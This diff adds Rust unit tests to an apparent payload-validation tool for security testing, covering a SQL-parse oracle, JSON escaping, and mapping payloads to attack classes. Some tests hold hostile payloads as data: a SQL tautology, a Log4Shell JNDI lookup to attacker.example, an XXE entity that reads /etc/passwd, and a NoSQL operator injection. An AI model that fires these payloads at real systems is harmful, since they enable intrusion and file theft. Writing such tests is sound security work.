@@ -656,4 +656,128 @@ mod tests {
         assert!(!verified_bypass("sql", ok, junk, false, 200), "non-attack");
         assert!(!verified_bypass("sql", ok, ok, false, 502), "upstream down");
     }
+
+    // ── oracle_valid per class ────────────────────────────────
+
+    #[test]
+    fn oracle_valid_unknown_class_returns_true() {
+        // Unknown class falls through to true (oracle doesn't gate),
+        // so a class string typo from upstream would silently
+        // accept everything. Pin the contract.
+        assert!(oracle_valid("not_a_class", "x", "x"));
+        assert!(oracle_valid("totally-bogus", "1 OR 1=1", "anything"));
+    }
+
+    #[test]
+    fn oracle_valid_sql_accepts_valid_tautology() {
+        // Numeric-context SQL oracle: `1 OR 1=1` is parseable as
+        // an expression injection. The original is unused for the
+        // sql arm (the dispatcher passes `transformed`).
+        assert!(oracle_valid("sql", "1 OR 1=1", "1 OR 1=1"));
+    }
+
+    #[test]
+    fn oracle_valid_sql_rejects_unparseable_noise() {
+        // The whole point of the oracle gate.
+        assert!(!oracle_valid(
+            "sql",
+            "1 OR 1=1",
+            ")) not sql at all (("
+        ));
+    }
+
+    // ── json_escape ───────────────────────────────────────────
+
+    #[test]
+    fn json_escape_handles_simple_ascii_unchanged() {
+        assert_eq!(json_escape("hello world"), "hello world");
+        assert_eq!(json_escape("abc123"), "abc123");
+    }
+
+    #[test]
+    fn json_escape_escapes_quote_and_backslash() {
+        assert_eq!(json_escape(r#""a\b""#), r#"\"a\\b\""#);
+    }
+
+    #[test]
+    fn json_escape_emits_short_escapes_for_known_controls() {
+        assert_eq!(json_escape("\n"), "\\n");
+        assert_eq!(json_escape("\r"), "\\r");
+        assert_eq!(json_escape("\t"), "\\t");
+    }
+
+    #[test]
+    fn json_escape_emits_unicode_escape_for_unprintable_controls() {
+        // Bell (0x07) has no short-escape; falls to .
+        assert_eq!(json_escape("\x07"), "\\u0007");
+        // NUL byte.
+        assert_eq!(json_escape("\0"), "\\u0000");
+        // Vertical tab.
+        assert_eq!(json_escape("\x0b"), "\\u000b");
+    }
+
+    #[test]
+    fn json_escape_passes_high_unicode_through_verbatim() {
+        // Anything ≥ 0x20 (printable) flows unchanged — including
+        // multi-byte UTF-8. JSON spec permits unescaped non-ASCII
+        // as long as it's valid UTF-8.
+        assert_eq!(json_escape("café 中文"), "café 中文");
+    }
+
+    #[test]
+    fn json_escape_output_parses_back_as_valid_json_string() {
+        // Round-trip: wrap in `"..."` and serde_json should accept.
+        for input in [
+            "hello",
+            "with \"quotes\"",
+            "with \\ backslash",
+            "control: \x01\x02\x07",
+            "newline:\nand:tab\t",
+        ] {
+            let wrapped = format!("\"{}\"", json_escape(input));
+            let parsed: String = serde_json::from_str(&wrapped)
+                .expect("escaped output must be valid JSON string");
+            assert_eq!(parsed, input, "round-trip mismatch on {input:?}");
+        }
+    }
+
+    // ── class_for_payload_type ────────────────────────────────
+
+    #[test]
+    fn class_for_payload_type_ssrf_unsupported_returns_none() {
+        // The moat doesn't ship a sound SSRF model — anti-rig
+        // against accidentally adding it without the equivalence
+        // predicates.
+        assert_eq!(class_for_payload_type(PayloadType::Ssrf), None);
+    }
+
+    #[test]
+    fn class_for_payload_type_nosql_unsupported_via_pt_returns_none() {
+        // NoSQL has equivalence via grammar::equiv::nosql but is
+        // not surfaced through class_for_payload_type today (the
+        // "_" arm returns None). Locks the current contract in so a
+        // future flip surfaces.
+        assert_eq!(class_for_payload_type(PayloadType::NoSql), None);
+    }
+
+    // ── is_valid_xxe / is_valid_log4shell / is_valid_nosql ────
+
+    #[test]
+    fn is_valid_log4shell_identity_holds() {
+        // A payload compared against itself must validate.
+        let p = "${jndi:ldap://attacker.example/x}";
+        assert!(is_valid_log4shell(p, p));
+    }
+
+    #[test]
+    fn is_valid_xxe_identity_holds() {
+        let p = r#"<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>"#;
+        assert!(is_valid_xxe(p, p));
+    }
+
+    #[test]
+    fn is_valid_nosql_identity_holds() {
+        let p = r#"{"$ne": null}"#;
+        assert!(is_valid_nosql(p, p));
+    }
 }
